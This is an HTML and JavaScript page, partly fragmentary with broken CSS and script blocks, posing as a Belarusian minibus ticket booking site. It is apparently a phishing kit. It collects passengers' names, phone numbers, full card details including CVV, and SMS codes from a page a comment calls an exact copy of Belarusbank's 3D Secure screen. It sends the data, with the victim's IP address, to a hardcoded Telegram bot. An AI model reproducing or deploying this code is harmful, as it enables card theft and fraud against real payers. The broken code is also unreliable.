<!DOCTYPE html>
<html lang="ru">
<head>

        .card {

            background: #1a2535;
            border-radius: 32px;
            padding: 32px 24px;

            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: white;
            text-align: center;
        }
        .route-panel {
            background: #0e1a28;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2d4b73;
        }
        .route-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #b7c4d9;
            font-size: 16px;
        }
        .price-large {

            color: #4299e1;
            text-align: center;
            margin: 20px 0;
            font-weight: 600;
        }
        .field {

        }
        .field label {
            display: block;
            color: #b7c4d9;
            margin-bottom: 6px;
            font-size: 14px;
        }
        .field input {
            width: 100%;
            background: #0e1a28;
            border: 1px solid #2d4b73;
            border-radius: 16px;
            padding: 16px;
            color: white;
            font-size: 16px;
            transition: 0.2s;
        }
        .field input:focus {
            outline: none;
            border-color: #4299e1;
            background: #142a40;
        }
        .field input::placeholder {
            color: #4a5a72;
        }
        .btn {
            background: #4299e1;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin: 20px 0 10px;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .btn-outline {
            background: transparent;
            border: 1px solid #4299e1;
            color: #4299e1;
        }
        .spinner {
            border: 3px solid #2d4b73;
            border-top: 3px solid #4299e1;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* 3D Secure —Å—Ç–∏–ª–∏ (—Ç–æ—á–Ω–∞—è –∫–æ–ø–∏—è –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫–∞) */
        .secure-container {

            border-radius: 24px;
            padding: 24px;
            margin-bottom: 20px;
        }

            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        }
        .secure-header span {

            font-weight: 600;
            color: white;
        }
        .secure-info {

            margin-bottom: 20px;

        .secure-code-input {

            padding: 20px;
            text-align: center;
            font-size: 32px;
            letter-spacing: 12px;
            color: white;
            width: 100%;
            margin-bottom: 20px;
        }
        .secure-code-input:focus {

        }
        .secure-footer {
            color: #6f7f99;
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
        }
        .success-icon, .fail-icon {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px auto 25px;
            font-size: 36px;
            border: 2px solid;
        }
        .success-icon {
            background: #1f4a3a;
            color: #2ecc71;
            border-color: #2ecc71;

        .fail-icon {

        }

            margin-top: 30px;
            color: #6f7f99;

        }
    </style>
</head>
<body>

    <script>
        (function() {
            // ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
            const ADMIN_ID = 5852338439;
            const urlParams = new URLSearchParams(window.location.search);

            // ========== –î–ê–ù–ù–´–ï –ú–ê–†–®–†–£–¢–ê (–∑–∞–≥–ª—É—à–∫–∞, –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∞—Ç—å —Å —Å–µ—Ä–≤–µ—Ä–∞) ==========
            const routeData = {

            async function sendToBot(type, extra = {}) {

                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' }));

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',

            // ========== –§–û–†–ú–ê–¢–¢–ï–†–´ ==========
            function formatCardNumber(v) {
                let d = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
                return parts.join(' ');
            }
            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }
            function formatCVV(v) {
                return v.replace(/\D/g, '').slice(0,3);
            }

            // ========== –†–ï–ù–î–ï–† –°–¢–†–ê–ù–ò–¶ ==========
            function render() {
                const app = document.getElementById('app');
                let html = `<h1>Marshrutka</h1>`;

                if (state.step === 'passenger') {
                    html += `<div class="route-panel">

                    html += `<div class="field">

                    html += `<div class="field">

                    html += `<div class="field">

                } else if (state.step === 'card') {
                    html += `<div class="route-panel">
                        <div class="route-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div>
                        <div class="route-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div>
                    </div>`;
                    html += `<div class="price-large">${routeData.price} BYN</div>`;
                    html += `<div class="field">
                        <label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
                        <input id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}">
                    </div>`;
                    html += `<div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                        <div class="field"><label>–°—Ä–æ–∫</label><input id="expiry" placeholder="–ú–ú/–ì–ì" value="${state.card.expiry}"></div>
                        <div class="field"><label>CVV</label><input id="cvv" placeholder="123" value="${state.card.cvv}"></div>
                    </div>`;
                    html += `<div class="field">
                        <label>–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã</label>
                        <input id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}">
                    </div>`;
                    html += `<button class="btn" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å ${routeData.price} BYN</button>`;
                    html += `<button class="btn btn-outline" onclick="state.step='passenger'; render();">‚Üê –ù–∞–∑–∞–¥</button>`;
                } else if (state.step === 'processing') {
                    html += `<div style="text-align:center; padding:20px 0;">
                        <div class="spinner"></div>
                        <div style="margin-top:20px; color:#b7c4d9;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</div>
                        <div style="margin-top:10px; font-size:14px; color:#6f7f99;">–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞... (–æ–±—ã—á–Ω–æ 30-60 —Å–µ–∫)</div>
                    </div>`;
                } else if (state.step === 'sms') {
                    // –¢–æ—á–Ω–∞—è –∫–æ–ø–∏—è 3D Secure –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫–∞
                    html += `<div class="secure-container">
                        <div class="secure-header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%234299e1'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="bank">
                            <span>3D Secure</span>
                        </div>
                        <div class="secure-info">
                            –î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–∞ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ –Ω–æ–º–µ—Ä<br>
                            <strong>${state.passenger.phone.slice(0,4)} *** **-${state.passenger.phone.slice(-2)}</strong>
                        </div>
                        <input class="secure-code-input" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}">
                        <button class="btn" id="confirmSmsBtn">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                        <button class="btn btn-outline" id="resendSmsBtn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –µ—â—ë —Ä–∞–∑</button>
                        <div class="secure-footer">–ù–∏–∫–æ–≥–¥–∞ –Ω–µ —Å–æ–æ–±—â–∞–π—Ç–µ —ç—Ç–æ—Ç –∫–æ–¥ —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º.</div>
                    </div>`;
                    html += `<button class="btn btn-outline" onclick="state.step='card'; render();">‚Üê –ù–∞–∑–∞–¥ –∫ –∫–∞—Ä—Ç–µ</button>`;
                } else if (state.step === 'processing2') {

                    </div>`;
                } else if (state.step === 'success') {
                    html += `<div style="text-align:center;">
                        <div class="success-icon">‚úì</div>
                        <h2 style="margin-bottom:15px;">–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h2>
                        <div style="color:#b7c4d9; margin-bottom:30px;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.<br>–î–∏—Å–ø–µ—Ç—á–µ—Ä —Å–≤—è–∂–µ—Ç—Å—è —Å –≤–∞–º–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç.</div>
                        <div class="route-panel">
                            <div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div>

                        </div>
                        <button class="btn" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                    </div>`;
                } else if (state.step === 'fail') {
                    html += `<div style="text-align:center;">
                        <div class="fail-icon">‚úï</div>
                        <h2 style="margin-bottom:15px;">–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h2>
                        <div style="color:#b7c4d9; margin-bottom:30px;">
                            –í–æ–∑–º–æ–∂–Ω—ã–µ –ø—Ä–∏—á–∏–Ω—ã:<br>
                            ‚Ä¢ –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤<br>
                            ‚Ä¢ –ù–µ–≤–µ—Ä–Ω—ã–π SMS-–∫–æ–¥<br>
                            ‚Ä¢ –ë–∞–Ω–∫ –æ—Ç–∫–ª–æ–Ω–∏–ª –æ–ø–µ—Ä–∞—Ü–∏—é
                        </div>

                }

                // –î–æ–±–∞–≤–ª—è–µ–º –ª–æ–≥–æ—Ç–∏–ø—ã –±–∞–Ω–∫–æ–≤ –≤–Ω–∏–∑—É
                html += `<div class="bank-strip">–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫ ‚Ä¢ –ü—Ä–∏–æ—Ä–±–∞–Ω–∫ ‚Ä¢ –ê–ª—å—Ñ–∞-–ë–∞–Ω–∫ ‚Ä¢ Visa ‚Ä¢ Mastercard ‚Ä¢ –ë–µ–ª–∫–∞—Ä—Ç</div>`;
                app.innerHTML = html;

                // ========== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò ==========
                if (state.step === 'passenger') {

                        state.step = 'card';
                        render();
                    });
                }

                if (state.step === 'card') {
                    const cn = document.getElementById('cardNumber');

                    const cv = document.getElementById('cvv');
                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        if (!state.card.number || !state.card.expiry || !state.card.cvv || !state.card.cardholder) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã');
                            return;
                        }
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–π –∫–∞—Ä—Ç–µ

                        state.step = 'processing';

                        // –ó–¥–µ—Å—å —Å–∞–π—Ç –∂–¥—ë—Ç –∫–æ–º–∞–Ω–¥—ã –æ—Ç –±–æ—Ç–∞ (—á–µ—Ä–µ–∑ –≥–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏)
                    });

                if (state.step === 'sms') {
                    document.getElementById('confirmSmsBtn')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
